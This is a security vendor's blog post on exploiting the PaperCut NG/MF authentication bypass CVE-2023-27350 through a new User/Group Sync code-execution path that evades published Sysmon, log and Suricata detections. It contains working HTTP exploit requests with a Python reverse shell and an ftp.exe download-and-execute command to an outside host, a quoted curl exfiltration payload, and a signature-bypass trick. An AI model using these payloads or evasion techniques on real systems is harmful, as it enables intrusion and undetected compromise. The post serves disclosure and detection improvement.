---
title: "PaperCut Exploitation - A Different Path to Code Execution- Blog - VulnCheck"
date: 2023-05-04T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# PaperCut Exploitation - A Different Path to Code Execution- Blog - VulnCheck

<br/>

<br/>
::check-list\\n---\\ntitle: Key Takeaways\\nico: mdi:check-bold\\nlist:\\n - In mid-April attackers began exploiting a vulnerability in PaperCut NG and MF that was later assigned CVE-2023-27350.\\n - Multiple security organizations published exploit detections and indicators of compromise, including Huntress, Horizon3.ai, Proofpoint, and Microsoft. \\n - Today, VulnCheck published a proof-of-concept exploit that bypasses all published detections. \\n - This report shows that detections that focus on one code execution method, or that focus on a small subset of techniques used by one threat actor, are doomed to be useless in the next round of attacks.\\n - Since attackers learn from defenders' public detections, it's the defenders’ responsibility to produce robust detections that aren’t easily bypassed.\\n---\\n::\\n\\n# Introduction\\n\\nIn mid-April, attackers began exploiting a vulnerability in \[PaperCut\](https://www.papercut.com/) NG and MF. The exploited vulnerability would later be assigned \[CVE-2023-27350\](https://nvd.nist.gov/vuln/detail/CVE-2023-27350). Multiple security organizations have published exploit detections and indicators of compromise that assume attackers are executing code through PaperCut’s built-in scripting interface. However, VulnCheck researchers have found a proof-of-concept exploit that bypasses all published detections from Huntress, Horizon3.ai, Emerging Threats and Microsoft. \\n\\nHow did this happen? PaperCut NG and MF offer multiple paths to code execution. In this blog, we detail one such path and show how an attacker can avoid existing detections based on the defender's incorrect assumptions.\\n\\nBefore diving into the new code execution path, let’s look at the history of this vulnerability and survey the current exploits and detections that the security community has published.\\n\\n# Background\\n\\n## Timeline \\n\\n::time-line\\n---\\nentries: \\n - date: March 15, 2023\\n markdown: PaperCut Software released an \[advisory\](https://web.archive.org/web/20230315190445/https://www.papercut.com/kb/Main/PO-1216-and-PO-1219) for two vulnerabilities discovered by Trend Micro’s \[ZDI\](https://www.zerodayinitiative.com/) program. The initial advisory contained no CVE identifiers, but instead referred to the vulnerabilities by their ZDI names: \[ZDI-CAN-18987\](https://www.zerodayinitiative.com/advisories/ZDI-23-233/) and \[ZDI-CAN-19226\](https://www.zerodayinitiative.com/advisories/ZDI-23-232/).\\n - date: April 13, 2023\\n markdown: Attacks in the wild began around this \[time\](https://news.sophos.com/en-us/2023/04/27/increased-exploitation-of-papercut-drawing-blood-around-the-internet/).\\n - date: April 19, 2023\\n markdown: PaperCut Software updated their \[advisory\](https://web.archive.org/web/20230419185044/https://www.papercut.com/kb/Main/PO-1216-and-PO-1219) to indicate the vulnerabilities had been exploited in the wild.\\n - date: April 20, 2023\\n markdown: CVE identifiers for the vulnerabilities were \[published\](https://www.cve.org/CVERecord?id=CVE-2023-27350). The authentication bypass was assigned CVE-2023-27350. The CVEs were published by ZDI, more than a month after they published their own advisories.\\n - date: April 21, 2023\\n markdown: Huntress Labs published a blog detailing exploitation in the wild. CISA added CVE-2023-27350 to the CISA KEV list. Public exploits demonstrating the bypass appeared on \[GitHub\](https://raw.githubusercontent.com/TamingSariMY/CVE-2023-27350-POC/main/vuln.py).\\n - date: April 24, 2023\\n markdown: Horizon3.ai \[published\](https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/) an exploit that demonstrated the bypass \*and\* executed arbitrary code.\\n - date: April 26, 2023\\n markdown: Microsoft attributes attacks in mid-April to \[TA505\](https://malpedia.caad.fkie.fraunhofer.de/actor/ta505).\\n---\\n::\\n\\n## Public Exploits\\n\\nAt the time of writing, two public exploit variants use CVE-2023-27350 and execute arbitrary code on PaperCut NG and MF:\\n\\n1. Exploits that use the PaperCut print scripting interface to execute Windows commands (variations on the Horizon3.ai exploit).\\n2. Exploits that use the print scripting interface to drop a malicious JAR (see this Metasploit \[pull request\](https://github.com/rapid7/metasploit-framework)).\\n\\nIn both cases, the attacker abuses the system’s built-in JavaScript interface. The JavaScript engine is \[Rhino\](https://en.wikipedia.org/wiki/Rhino\_(JavaScript\_engine)), which also allows that user to execute arbitrary Java. PaperCut Software implemented configuration options to lessen the risk of this arbitrary code execution vector, but since the attacker has full administrative access, those protections are easily disabled.\\n\\nHorizon3.ai’s exploit uses the scripting interface to execute a single Windows command (\`whoami\`) and sends the response back to the attacker via \`curl\`:\\n\\n\`\`\`java\\njava.lang.Runtime.getRuntime().exec('cmd.exe /C \\"for /F \\"usebackq delims=\\" %A in (\`whoami\`) do curl http://10.0.40.83:8081/%A\\"');\\n\`\`\`\\n\\nPerhaps the main reason they didn’t establish a reverse shell is because the scripting engine has a five second timeout (see decompiled code below). The attacker cannot maintain execution in the engine itself; they have to migrate to another process. \\n\\n!\[decompiled papercut jar\](/blog/papercut-rce/rhino-timeout.png){:width="100%"}\\n\\nThe previously mentioned Metasploit module is interesting. It doesn’t use \`java.Runtime.getRuntime().exec()\`. Instead, it uses \`java.net.URLClassLoader\` to load a remote Java class. The loaded class will eventually drop a Meterpreter JAR to disk and execute it.\\n\\nThe Java-focused exploitation is useful because PaperCut NG and MF support Linux, Mac, \*and\* Windows. A Windows-only only attack is restricted to… only Windows victims. This approach treats all victims equally.\\n\\nUnfortunately, while it sounds good on paper, the Metasploit attack is not great. The Meterpreter jar is more or less unobfuscated and well-known to be immediately flagged by Windows Defender (among other AV). As soon as it touches the disk, it’ll be removed. On Linux, where there is less likely to be any AV/EDR, the payload screams that it's malicious. The phrase “metasploit.Payload” literally appears in \`ps\` output.\\n\\n\`\`\`sh\\npapercut 40671 /home/papercut/runtime/linux-x64/jre/bin/java -classpath /tmp/~spawn8498983783261235927.tmp.dir metasploit.Payload\\npapercut 40689 \\\_ sh -c /bin/sh\\npapercut 40690 \\\_ /bin/sh\\n\`\`\`\\n\\nEither way, both approaches trigger detections that’ve been shared among the security community, so let’s look at those more closely.\\n\\n## Existing Detections\\n\\nThere have been three types of detections published so far.\\n\\n1. Detection via Sysmon (e.g. process creation analysis).\\n2. Detection via log file analysis.\\n3. Network signatures.\\n\\n### Sysmon Detections \\n\\nThe Sysmon (or sysmon-esque) detections have been offered up by \[Huntress\](https://github.com/huntresslabs/threat-intel/blob/main/2023/2023-04/20-PaperCut/win\_susp\_papercut\_code\_execution.yml) and \[Sophos\](https://news.sophos.com/en-us/2023/04/27/increased-exploitation-of-papercut-drawing-blood-around-the-internet/). Both essentially boil down to this:\\n\\n> If \`pc-app.exe\` creates a child process called \`cmd.exe\` or \`powershell.exe\` then an attacker is exploiting PaperCut NG/MF.\\n\\nThis is not unreasonable logic. It’s just insufficient. Already we’ve seen a PaperCut exploit that \*\*doesn’t\*\* wouldn’t trigger this detection. Below is Meterpreter being started by \`pc-app.exe\` using \`java.exe\` (note the “spawn” logic in the \[Java Meterpreter\](https://github.com/rapid7/metasploit-javapayload/blob/dee9809f78a7e86981a8f39e0622f05458c85940/javapayload/src/main/java/metasploit/Payload.java#L82)).\\n\\n!\[meterpreter jar spawned on windows\](/blog/papercut-rce/spawned-meterpreter.png){:width="100%"}\\n\\nThere are a whole slew of well-documented \[LOLBAS\](https://lolbas-project.github.io/) an attacker can abuse that would allow them to bypass these detections (as we’ll see later).\\n\\n### Log File Detections\\n\\nAttacking PaperCut NG and MF via the print scripting interfaces leaves very distinctive entries in the server’s log file. Horizon3.ai noted variations of these entries as good indicators of compromise:\\n\\n\`\`\`\\nUser "admin" logged into the administration interface.\\nUser "admin" updated the config key “print.script.sandboxed”\\nUser "admin" updated the config key “device.script.sandboxed”\\nAdmin user "admin" modified the print script on printer\\n\`\`\`\\n\\nThe first entry is generated by CVE-2023-27350 directly. But it's also generated by a normal admin user logging in. Alone, it doesn’t indicate a compromise. The other three entries are all associated with attacking the scripting interface(s). An attacker that doesn’t abuse this functionality won’t generate this particular log entries.\\n\\n## Network Signatures\\n\\nProof Point’s Open Emerging Threats contains signatures to detect the authentication bypass on the wire. The Suricata rule, modified for brevity, looks like so:\\n\\n\`\`\`sh\\nalert http any any -> $HOME\_NET any ( \\\\n msg:"ET EXPLOIT PaperCut MF/NG SetupCompleted Authentication Bypass (CVE-2023-27350)"; \\\\n flow:established,to\_server; \\\\n http.method; content:"GET"; \\\\n http.uri; content:"/app?service=page/SetupCompleted"; bsize:32; fast\_pattern; \\\\n reference:cve,2023-27350; \\\\n classtype:attempted-admin; \\\\n sid:2045130; rev:1;)\\n\`\`\`\\n\\nThe rule focuses on detecting the exploitation of the vulnerability itself, and \*not\* the post-authentication activity, which is likely smart. That’s a very smart approach, and it would detect the previously mentioned exploits.\\n\\nHowever, an attacker interested in doing so can trivially bypass this signature (by using \`page//SetupCompleted\` or \`random=1&page/SetupCompleted\`, etc.). \\n\\n# A New Path to Exploitation\\n\\nAs an attacker, if you know a variety of detections will flag your nefarious activities you'll obviously do whatever it takes to bypass those detections. In the case of PaperCut NG and MF, however, all the attacker really needs to do is find a new path to code execution. A new path will prevent the bad log entries from being written, and then the attacker can use whatever LOLBAS bypass the process creation detections.\\n\\nThere are a few places the attacker can pivot to, but let’s look at how an attacker can abuse the PaperCut NG “User/Group Sync” logic. This interface allows the administrative user to specify a “Custom Program” to source and authenticate users.\\n\\n!\[PaperCut NG User/Group Sync\](/blog/papercut-rce/usergroupsync.png){:width="100%"}\\n\\nThe user/auth programs can be any program on disk. That sounds great (for an attacker), but there are two caveats:\\n\\n1. The programs are initially executed without any attacker-controlled parameters.\\n2. The auth program has to be interactive (e.g. the username and password are passed via \`stdin\`).\\n\\nThat is restrictive, but we’ve developed proof-of-concept exploits for both Linux and Windows:\\n\\n1. On Linux, set the auth program to \`/usr/sbin/python3\`.\\n2. On Windows, set the auth program to \`C:\\Windows\\System32\\ftp.exe\`.\\n\\n!\[Python3 as Auth Program\](/blog/papercut-rce/python3authprogram.png){:width="100%"}\\n\\nTo execute arbitrary code, the attacker just needs to provide a malicious username and password during a login attempt. For example, on Linux we provide a typical Python reverse shell in the \`inputPassword\` parameter. \\n\\n\`\`\`sh\\nPOST /app HTTP/1.1\\nHost: 10.9.49.222:9191\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33\\nContent-Length: 406\\nContent-Type: application/x-www-form-urlencoded\\nCookie: JSESSIONID=node01s8zloj765g3lirbwnppvw1qo279.node0\\nOrigin: http://10.9.49.222:9191/\\nReferer: http://10.9.49.222:9191/app\\nAccept-Encoding: gzip\\nservice=direct/1/Home/$Form&sp=S0&$Submit$0=Log+in&inputUsername=help&inputPassword=import socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.9.49.194",1270));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")&Form0=$Hidden$0,$Hidden$1,inputUsername,inputPassword,$Submit$0,$PropertySelection&$Hidden$0=true&$Hidden$1=X&$PropertySelection=en\\n\`\`\`\\n\\nThe \`ps\` output is still suspicious, but at least the name of a famously malicious pentesting framework appear:\\n\`\`\`sh\\npapercut 17572 \\\_ /home/papercut/server/bin/linux-x64/./app-monitor /home/papercut/server/bin/linux-x64/./app-monitor.conf wrapper.syslog.ident=paperc\\npapercut 17574 \\\_ ../runtime/linux-x64/jre/bin/pc-app -Djava.io.tmpdir=tmp -Dserver.home=. -Xverify:none -XX:+UseParallelOldGC -server -Dpc-reserv\\npapercut 43227 \\\_ /usr/bin/python3\\npapercut 43232 \\\_ /bin/sh\\n\`\`\`\\n\\nOn the Windows side of things, we’ve chosen \`ftp.exe\` as our authentication program. \`ftp.exe\` will execute arbitrary commands if they are prepended with a bang (\`!\`). On the wire, that looks like this:\\n\\n\`\`\`sh\\nPOST /app HTTP/1.1\\nHost: 10.9.49.195:9191\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33\\nContent-Length: 360\\nContent-Type: application/x-www-form-urlencoded\\nCookie: JSESSIONID=node012xt0dzcjh0dy5wz7uvh9m26f23.node0\\nOrigin: http://10.9.49.195:9191/\\nReferer: http://10.9.49.195:9191/app\\nAccept-Encoding: gzip\\nForm0=$Hidden$0,$Hidden$1,inputUsername,inputPassword,$Submit$0,$PropertySelection&$PropertySelection=en&inputUsername=dir&service=direct/1/Home/$Form&sp=S0&$Hidden$0=true&$Hidden$1=X&$Submit$0=Log+in&inputPassword=!curl -s -A Mozilla/5.0 -o C:\\ProgramData\\AXtJxdUwlfJl.exe http://10.9.49.194:8080/AXtJxdUwlfJl %26 C:\\ProgramData\\AXtJxdUwlfJl.exe 10.9.49.194 1270\\n\`\`\`\\n\\nThe attack we’ve chosen is really quite basic. The \`inputPassword\` contains logic to download a binary to \`C:\\ProgramData\\\` and execute it. In our case, this binary is a custom reverse shell (written in Go). The result is that \`cmd.exe\` is never a direct child of \`pc-app.exe\`. The process tree is: \`pc-app.exe\` -> \`ftp.exe\` -> \`cmd.exe\` -> \`AXtJxdUwlfJI.exe\`.\\n\\n!\[Process creation events\](/blog/papercut-rce/ftpspawnscmd.png){:width="100%"}\\n\\nThe process tree, quite obviously, demonstrates poor tradecraft, but it’s sufficient to work around the published process-creation-based detections discussed earlier.\\n\\nImportantly, because this approach doesn’t use a scripting interface, this attack also doesn’t generate the expected log entries. An attack using the “User/Group” custom program will generate logs that look more like this:\\n\\n\`\`\`\\nUser/Group Sync settings changed by "admin"\\nUser "admin" logged into the administration interface.\\n\`\`\`\\n\\nThe full result is that we can establish reverse shells on both Windows and Linux targets without triggering any detections.\\n\\n::youtube-video\\n---\\nid: NTYQaZsFxiI\\ntitle: PaperCut NG and MF Remote Code Execution (CVE-2023-27350 + User/Group Sync) \\n---\\n::\\n\\n# Conclusion\\n\\nAn administrative user attacking PaperCut NG and MF can follow multiple paths to arbitrary code execution. Detections that focus on one particular code execution method, or that focus on a small subset of techniques used by one threat actor are doomed to be useless in the next round of attacks. Attackers learn from defenders' public detections, so it’s the defenders’ responsibility to produce robust detections that aren’t easily bypassed.\\n

#### [Source](https://vulncheck.com/blog/papercut-rce)

<br/>
---
